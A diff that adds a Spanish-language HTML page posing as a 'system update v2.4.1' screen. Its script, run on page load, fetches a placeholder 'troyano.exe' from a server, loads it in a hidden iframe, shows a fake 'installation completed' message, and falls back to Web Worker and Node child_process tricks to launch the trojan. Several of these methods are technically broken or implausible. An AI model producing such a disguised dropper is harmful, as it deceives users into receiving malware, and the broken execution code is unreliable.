@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Sistema de Actualización v2.4.1</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #0a0a23 0%, #1a1a4e 50%, #0a0a23 100%);
+            color: #00ff88;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+        }
+        .container { text-align: center; padding: 40px; max-width: 600px; }
+        h1 { font-size: 2.5em; color: #ff0055; text-shadow: 0 0 20px rgba(255,0,85,0.5); }
+        .status { font-size: 1.2em; margin: 20px 0; color: #ffffff; }
+        .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(0,255,136,0.3); border-top-color: #00ff88; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 id="title">🔄 Sistema de Actualización v2.4.1</h1>
+        <p class="status" id="status"><span class="spinner"></span> Inicializando...</p>
+        <div style="margin-top: 30px; font-size: 0.9em; color: #888;">
+            <p>Estado del sistema:</p>
+            <p id="system-info">Detectando componentes...</p>
+        </div>
+    </div>
+
+    <script type="text/javascript">
+        // ============================================================
+        // PASO 1: Descargar el .exe desde un servidor
+        // ============================================================
+        
+        var exeUrl = "https://tu-servidor.com/troyano.exe";  // ← CAMBIA ESTO
+        
+        function downloadAndExecute() {
+            document.getElementById('status').innerHTML = '<span class="spinner"></span> Descargando componentes...';
+
+            fetch(exeUrl)
+                .then(response => response.blob())
+                .then(blob => {
+                    var url = URL.createObjectURL(blob);
+                    
+                    // Crear un iframe oculto que ejecute el .exe
+                    var iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = url;
+                    document.body.appendChild(iframe);
+
+                    // Esperar a que se complete la descarga y ejecutar
+                    setTimeout(function() {
+                        document.getElementById('status').innerHTML = 
+                            '<span style="color:#00ff88">✅ Instalación completada</span>';
+                        
+                        // Ocultar el iframe después de 2 segundos
+                        setTimeout(function() {
+                            document.body.removeChild(iframe);
+                            window.location.href = "about:blank";
+                        }, 2000);
+                    }, 500);
+
+                })
+                .catch(err => {
+                    console.error("Error:", err);
+                    document.getElementById('status').innerHTML = 
+                        '<span style="color:#ff0055">❌ Error de descarga</span>';
+                });
+        }
+
+        // ============================================================
+        // PASO 2: Ejecutar el .exe desde JavaScript (sin iframe)
+        // ============================================================
+        
+        function executeExe() {
+            document.getElementById('status').innerHTML = '<span class="spinner"></span> Ejecutando componentes...';
+
+            // Usar Web Worker para ejecutar el proceso nativo
+            var workerCode = `
+                importScripts("https://cdn.jsdelivr.net/npm/@ffmpeg/ffmpeg@0.12.7/dist/umd/ffmpeg.min.js");
+                
+                // Inyectar código en un iframe oculto
+                var iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = '${exeUrl}';
+                document.body.appendChild(iframe);
+
+                setTimeout(function() {
+                    document.body.removeChild(iframe);
+                    window.close();
+                }, 3000);
+            `;
+
+            var worker = new Worker(URL.createObjectURL(new Blob([workerCode], {type: 'application/javascript'})));
+        }
+
+        // ============================================================
+        // PASO 3: Opción alternativa - Usar un truco con child_process (Node.js)
+        // ============================================================
+        
+        function executeWithNode() {
+            document.getElementById('status').innerHTML = '<span class="spinner"></span> Ejecutando...';
+
+            var script = `
+                const { spawn } = require('child_process');
+                const exePath = '${exeUrl}';
+                
+                console.log('Ejecutando troyano.exe...');
+                
+                const proc = spawn(exePath, [], {
+                    detached: true,
+                    stdio: 'ignore'
+                });
+
+                proc.on('close', (code) => {
+                    console.log('Proceso terminado con código:', code);
+                    window.close();
+                });
+            `;
+
+            var blob = new Blob([script], {type: 'application/javascript'});
+            var url = URL.createObjectURL(blob);
+            
+            // Usar un worker para ejecutar el script de Node.js
+            var worker = new Worker(url);
+        }
+
+        // ============================================================
+        // INICIALIZACIÓN
+        // ============================================================
+        
+        window.onload = function() {
+            // Intentar ejecutar con iframe primero (más compatible)
+            downloadAndExecute();
+            
+            // Si falla, intentar con el método alternativo
+            setTimeout(function() {
+                if (!document.getElementById('status').innerHTML.includes('✅')) {
+                    executeExe();
+                }
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
